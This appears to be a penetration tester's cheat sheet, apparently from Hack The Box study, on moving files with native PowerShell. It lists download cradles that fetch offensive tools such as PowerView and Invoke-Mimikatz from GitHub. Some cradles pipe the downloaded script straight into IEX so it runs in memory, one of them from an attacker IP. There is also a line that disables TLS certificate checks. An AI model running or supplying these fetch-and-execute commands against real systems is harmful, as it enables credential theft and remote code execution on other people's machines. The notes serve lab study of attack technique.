Native File Transfer Powershell
################################

Date: 2024-11-01 11:47

Status:


Native File Downloads
************************
Windows File Transfer Methods that are available within powershell

By using the `system.net.webclient
methods <https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0>`__

Example 1: Download to Disk

.. code-block:: console

   PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
   PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

   PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
   PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')

Example 2: Download and execute in memory

Using the invoke Expression method:

.. code-block:: console


   PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

There is also a cmdlet like wget on Powershell called
`invoke-WebRequest <invoke-WebRequest>`__

.. code-block:: console

   PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

Issues you may encounter
*************************

On a first time run a Window may pop up asking to configure Explorer.
You can bypass this by adding (UseBasicParsing):

.. code-block:: console


   PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

If you are accessing a resource that has an invalid certificate, you
will have to configure the server to accept invalid certs.

.. code-block:: console

   PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

References
*************
`Harmj0y powershell
cradles <https://gist.github.com/HarmJ0y/bb48307ffa663256e239>`__
